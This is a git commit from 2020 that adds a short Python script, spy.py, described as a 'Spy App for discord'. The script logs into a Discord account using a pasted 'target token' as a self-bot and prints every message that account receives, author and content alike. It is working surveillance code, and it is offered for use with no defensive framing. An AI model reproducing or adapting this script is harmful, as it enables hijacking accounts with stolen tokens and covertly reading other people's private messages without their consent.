5744717876564903a3a5f8b84ddc67f44f700314
NullByte75 <66488397+NullByte75@users.noreply.github.com>
2020-07-28 15:58:06 +0200

    Add files via upload
    Spy App for discord

---
+++ spy.py
@@ -0,0 +1,17 @@
+import discord
+from discord.ext import commands
+import asyncio
+import os
+import random
+username = os.getlogin()
+token = "" #insert target token
+prefix = ""
+client = discord.Client()
+message = discord.Message 
+bot = commands.Bot(command_prefix=prefix, self_bot=True)
+@bot.event
+async def on_message(message):
+    print(message.author.name + ":" + " " + message.content)
+asyncio.set_event_loop(asyncio.new_event_loop())
+loop = asyncio.new_event_loop()
+bot.run(token, bot=False)
